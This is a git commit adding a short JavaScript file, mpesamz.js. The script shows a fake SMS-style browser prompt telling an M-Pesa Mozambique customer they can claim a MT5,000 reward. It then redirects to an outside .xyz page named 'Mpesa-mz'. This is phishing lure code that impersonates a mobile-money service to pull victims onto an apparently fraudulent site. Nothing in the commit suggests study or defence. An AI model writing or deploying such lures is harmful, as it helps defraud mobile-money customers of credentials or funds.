50df4e90e8aa86651cb3a564c9e8e875090e55a8
newetijazz8 <newetijazz8@gmail.com>
2025-09-24 06:46:27 +0100

    Create mpesamz.js

---
+++ mpesamz.js
@@ -0,0 +1,5 @@
+var password = 'SAQUE MT5.000'
+password=prompt('SMS: Parabéns, seu número de conta M-pesa é elegível para receber uma recompensa de MT5.000 para antigos clientes, clique em OK para sacar dinheiro','SAQUE MT5.000');
+if (password != 'SAQUE MT5.000') {
+location.href='https://www.itinpty.xyz/Mpesa-mz';
+}
